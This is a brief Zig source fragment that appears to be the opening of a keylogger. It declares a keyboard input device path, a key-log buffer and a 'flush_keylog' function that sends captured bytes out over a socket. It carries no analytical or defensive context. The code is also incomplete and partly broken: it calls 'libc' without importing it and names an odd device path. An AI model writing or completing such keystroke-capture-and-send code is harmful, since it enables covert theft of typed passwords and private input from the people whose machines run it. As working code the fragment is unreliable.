const std = @import("std");
const keyboard = "/dev/input/keyboard";
const stack = "/dev/io-pkt-stm";
const KEYLOG_BUF_SIZE = 2048;
fn flush_keylog(socket: c_int, buffer: []const u8) void {
    _ = libc.send(socket, buffer.ptr, buffer.len, 0);
}
